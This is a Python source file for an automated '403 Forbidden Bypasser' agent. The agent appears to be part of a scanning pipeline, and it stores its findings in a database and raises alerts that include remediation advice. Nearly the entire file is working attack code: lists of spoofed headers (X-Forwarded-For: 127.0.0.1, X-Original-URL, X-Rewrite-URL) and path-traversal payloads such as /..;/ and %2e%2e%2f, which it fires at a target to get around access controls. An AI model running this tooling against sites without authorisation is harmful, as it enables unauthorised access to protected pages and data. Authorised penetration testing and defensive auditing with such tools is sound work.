import asyncio
import datetime
import logging
import json
import os
import httpx
from base_agent import BaseAgent, logger

class Bypass403Agent(BaseAgent):
    def __init__(self):
        super().__init__("bypass_403", "403 Forbidden Bypasser")
        self.headers_to_test = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Forwarded-Host": "localhost"},
            {"X-Originating-IP": "127.0.0.1"},
            {"X-Remote-IP": "127.0.0.1"},
            {"X-Remote-Addr": "127.0.0.1"},
            {"X-Client-IP": "127.0.0.1"},
            {"X-Host": "127.0.0.1"},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"X-Forwarded-For": "8.8.8.8"},
            {"Forwarded": 'for=127.0.0.1;by=127.0.0.1;host=localhost'},
        ]
        # Path payloads inspired by BurpSuite_403Bypasser variations
        self.path_payloads = [
            "/%2e/", "/./", "/..;/", "/%2f/", "//", "/./", "/??", "/#", 
            "/.html", "/.php", "/.json", "/.jsp", "/.ashx", "/.aspx",
            "/%20/", "/admin/..;/", "/.;/", "/..;/", "/..%2f", "/%2e%2e%2f"
        ]

    async def test_bypass(self, base_url, path):
        """Iterate through bypass techniques for a specific path."""
        target_path = path.lstrip("/")
        full_url = f"{base_url}/{target_path}".rstrip("/")
        
        results = []

        async with httpx.AsyncClient(verify=False, timeout=10.0, follow_redirects=False) as client:
            # 1. Test Header Bypasses
            for header in self.headers_to_test:
                try:
                    resp = await client.get(full_url, headers=header)
                    if resp.status_code < 400:
                        results.append({
                            "type": "header",
                            "payload": str(header),
                            "status": resp.status_code,
                            "url": full_url,
                            "content": resp.text,
                            "length": len(resp.content),
                            "words": len(resp.text.split())
                        })
                except Exception as e:
                    logger.debug(f"Header test failed: {e}")

            # 2. Test Path Bypasses & Normalization
            # Combinations like /path/. or /path%20/
            variations = [
                f"{base_url}/{target_path}/.",
                f"{base_url}/{target_path}//",
                f"{base_url}/{target_path}/./",
                f"{base_url}/{target_path}%20/",
                f"{base_url}/{target_path}?",
                f"{base_url}/{target_path}???",
                f"{base_url}/{target_path}/.random"
            ]
            
            for mod_url in variations:
                try:
                    resp = await client.get(mod_url)
                    if resp.status_code < 400:
                        results.append({
                            "type": "path_variation",
                            "payload": mod_url.replace(full_url, ""),
                            "status": resp.status_code,
                            "url": mod_url,
                            "content": resp.text,
                            "length": len(resp.content),
                            "words": len(resp.text.split())
                        })
                except Exception as e:
                    logger.debug(f"Path variation test failed: {e}")

            for payload in self.path_payloads:
                # Try prefixing the path
                modified_url = f"{base_url}{payload}{target_path}"
                try:
                    resp = await client.get(modified_url)
                    if resp.status_code < 400:
                        results.append({
                            "type": "path_prefix",
                            "payload": payload,
                            "status": resp.status_code,
                            "url": modified_url,
                            "content": resp.text,
                            "length": len(resp.content),
                            "words": len(resp.text.split())
                        })
                except Exception as e:
                    logger.debug(f"Path prefix test failed: {e}")

            # 3. Test URL rewriting headers
            rewrite_headers = [
                {"X-Original-URL": f"/{target_path}"},
                {"X-Rewrite-URL": f"/{target_path}"},
                {"Referer": f"/{target_path}"}
            ]
            for rw_header in rewrite_headers:
                try:
                    # Request the root with the rewrite header
                    resp = await client.get(base_url, headers=rw_header)
                    if resp.status_code < 400:
                        results.append({
                            "type": "rewrite",
                            "payload": str(rw_header),
                            "status": resp.status_code,
                            "url": base_url,
                            "content": resp.text,
                            "length": len(resp.content),
                            "words": len(resp.text.split())
                        })
                except Exception as e:
                    logger.debug(f"Rewrite test failed: {e}")

        return results

    async def create_bypass_alert(self, root_domain, target, finding):
        """Create a high-risk lead/alert for a successful 403 bypass using the centralized alerting system."""
        # Alerts for successful bypasses are critical and should be enabled.
        
        title = f"SECURITY CRITICAL: 403 Bypass Success on {target}"
        risk = "high"
        
        # Limit content snippet for details
        content_snippet = (finding['content'][:500] + '...') if len(finding['content']) > 500 else finding['content']
        
        details = f"A successful 403 Forbidden bypass was detected using methods from BurpSuite_403Bypasser!\n\n" \
                  f"Target Path: {finding['url']}\n" \
                  f"Technique Type: {finding['type']}\n" \
                  f"Payload/Header: {finding['payload']}\n" \
                  f"Resulting Status Code: {finding['status']}\n\n" \
                  f"### Response Content Snippet\n```html\n{content_snippet}\n```"
        
        exploitation = f"### Bypass Exploitation & Verification\n\n" \
                       f"1. **Manual Verification**: Replicate the request using `curl` or Burp Suite:\n" \
                       f"   `curl -k -v -H \"{finding['payload']}\" {finding['url']}`\n" \
                       f"2. **Assess Exposure**: Determine what functionality or data was protected by the 403 status.\n" \
                       f"3. **Remediation**: Ensure access control is enforced at the application layer, not just by reverse proxies or WAFs."

        description = f"Successful 403 bypass using {finding['type']} manipulation."
        await self.create_alert(title, description, target, risk, details, exploitation, alert_type="bypass_403_success")

    async def process_tasks(self):
        task = await self.get_next_task("bypass_403")

        if not task:
            return

        target = task["target"]
        root_domain = task["root_domain"]
        forbidden_path = task["path"]
        base_url = task["base_url"]

        try:
            logger.info(f"Starting 403 bypass attempts on {base_url}/{forbidden_path}")
            all_bypasses = await self.test_bypass(base_url, forbidden_path)
            
            if all_bypasses:
                # Identify catch-all patterns (False Positives)
                # We group by (status, length, words) fingerprint
                fingerprints = {}
                for b in all_bypasses:
                    fp = (b['status'], b.get('length', 0), b.get('words', 0))
                    fingerprints[fp] = fingerprints.get(fp, 0) + 1
                
                # Threshold: if many techniques yield same response, it's likely just a generic error page
                catch_all_fps = {fp for fp, count in fingerprints.items() if count > 3}
                
                successful_bypasses = []
                for b in all_bypasses:
                    b_fp = (b['status'], b.get('length', 0), b.get('words', 0))
                    if b_fp not in catch_all_fps:
                        successful_bypasses.append(b)
                    else:
                        logger.debug(f"Suppressing 403 bypass alert for redundant fingerprint: {b_fp}")

                if successful_bypasses:
                    logger.info(f"FOUND {len(successful_bypasses)} unique bypasses for {target}/{forbidden_path}!")
                    for finding in successful_bypasses:
                        await self.create_bypass_alert(root_domain, target, finding)
                
                # Update web_applications with bypass findings (still store all for reference, but maybe only unique ones)
                domain_doc = await self.domains_col.find_one({"domain": root_domain})
                if domain_doc:
                    web_apps = domain_doc.get("web_applications", [])
                    for app in web_apps:
                        if app.get("target") == target:
                            bypasses = app.get("403_bypasses", [])
                            # Simple deduplication by payload
                            existing_payloads = [b['payload'] for b in bypasses]
                            for b in all_bypasses: # Store all in the domain doc for completeness, or just unique? Let's do all.
                                if b['payload'] not in existing_payloads:
                                    bypasses.append(b)
                            app["403_bypasses"] = bypasses
                            break
                    
                    await self.domains_col.update_one(
                        {"domain": root_domain},
                        {"$set": {"web_applications": web_apps}}
                    )
            else:
                logger.info(f"No successful bypasses for {target}/{forbidden_path}")

            await self.tasks_col.update_one(
                {"_id": task["_id"]},
                {"$set": {"status": "completed", "completed_at": datetime.datetime.utcnow()}}
            )
            await self.check_completion(root_domain)

        except Exception as e:
            logger.error(f"Error in 403 bypass for {target}: {e}")
            await self.tasks_col.update_one(
                {"_id": task["_id"]},
                {"$set": {"status": "failed", "error": str(e)}}
            )

if __name__ == "__main__":
    print("--- 403 Bypasser Agent Starting ---")
    agent = Bypass403Agent()
    asyncio.run(agent.main_loop())
